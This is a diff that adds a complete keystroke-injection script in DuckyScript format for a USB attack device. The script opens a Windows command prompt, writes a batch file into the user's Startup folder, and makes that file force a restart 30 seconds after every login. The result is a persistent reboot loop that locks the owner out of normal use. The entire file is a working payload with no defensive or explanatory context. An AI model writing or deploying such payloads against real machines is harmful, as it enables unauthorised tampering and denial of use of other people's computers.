@@ -1,0 +1,26 @@
+DELAY 3000
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING copy con "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Shutdown.bat"
+DELAY 500
+ENTER
+DELAY 1000
+STRING @echo off
+DELAY 500
+ENTER
+DELAY 500
+STRING shutdown /r /t 30
+DELAY 500
+ENTER
+DELAY 500
+CTRL z
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
